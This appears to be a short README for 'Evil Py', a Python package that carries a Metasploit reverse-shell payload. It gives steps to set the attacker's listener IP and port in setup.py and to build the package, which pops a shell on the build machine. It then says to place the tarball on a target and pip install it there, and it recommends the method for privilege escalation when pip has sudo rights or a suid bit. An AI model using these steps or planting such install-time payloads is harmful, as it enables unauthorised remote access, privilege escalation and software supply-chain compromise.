# Evil Py
This is a python package MSF Payload developed by sn0wfa11.

https://github.com/sn0wfa11

## Setup Instructions
- Change the IP and Port in setup.py to your LHOST and LPORT
- Install the package compile dependencies
```
python -m pip install --user --upgrade setuptools wheel
```
- Build the package 
  - Go to the directory where setup.py is located
  - **Note: This will pop a shell on you build computer! Great way to test the package**
  - This will throw errors, but don't worry about it.
```
python setup.py sdist bdist_wheel
```
- Grab the .tar.gz file out of the /dist folder and place this on your target
- Run `pip install evil_py-<version>.tar.gz`
- Works great for PE if you have sudo rights for pip or pip's suid bit is set!
